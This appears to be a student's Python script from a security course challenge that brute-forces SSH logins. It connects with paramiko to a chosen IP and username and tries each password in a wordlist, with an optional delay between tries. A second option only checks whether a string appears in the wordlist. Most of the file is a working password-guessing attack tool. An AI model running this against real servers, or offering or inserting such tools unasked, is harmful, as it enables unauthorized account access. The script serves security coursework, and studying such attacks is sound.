#!/usr/bin/env python3

# Script Name:                  ops401code/ops-401d1:Challenge17.py
# Author:                       Cody Blahnik
# Date of latest revision:      5/21/24
# Purpose:                      Brute force tool using wordlists


import time
import paramiko
from nltk.corpus import words

# Function to perform SSH brute-force attack
def ssh_brute_force(ip, username, word_list, delay):
    for word in word_list:
        word = word.strip()
        print(f"Trying password: {word}")
        try:
            # Create an SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect to the SSH server
            ssh.connect(ip, username=username, password=word, timeout=1)
            
            print(f"Success! The password is: {word}")
            ssh.close()
            return word  # Return the successful password
        except paramiko.AuthenticationException:
            print("Authentication failed.")
        except paramiko.SSHException as sshException:
            print(f"Unable to establish SSH connection: {sshException}")
        except Exception as e:
            print(f"Exception: {e}")
        
        time.sleep(delay)
    
    print("Brute-force attack failed. No password matched.")
    return None

# Offensive function for SSH brute-force
def offensive():
    ip = input("Enter the SSH server IP address: ")
    username = input("Enter the SSH username: ")
    file_path = input("Enter the word list file path: ")
    delay = float(input("Enter the delay between attempts (in seconds): "))
    
    try:
        with open(file_path, encoding="ISO-8859-1") as file:
            word_list = file.readlines()
            ssh_brute_force(ip, username, word_list, delay)
    except FileNotFoundError:
        print(f"File not found: {file_path}")

# Defensive function to search for a string in the word list
def defensive():
    user_string = input("Enter the string to search for: ")
    file_path = input("Enter the word list file path: ")

    try:
        with open(file_path, 'r', encoding="ISO-8859-1") as file:
            word_list = file.readlines()
            if any(user_string in word for word in word_list):
                print(f"The string '{user_string}' was found in the word list.")
            else:
                print(f"The string '{user_string}' was NOT found in the word list.")
    except FileNotFoundError:
        print(f"File not found: {file_path}")

# Main menu for user interaction
def main():
    print("Automated Brute Force Wordlist")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    choice = input("Select an option (1 or 2): ")

    if choice == '1':
        offensive()
    elif choice == '2':
        defensive()
    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
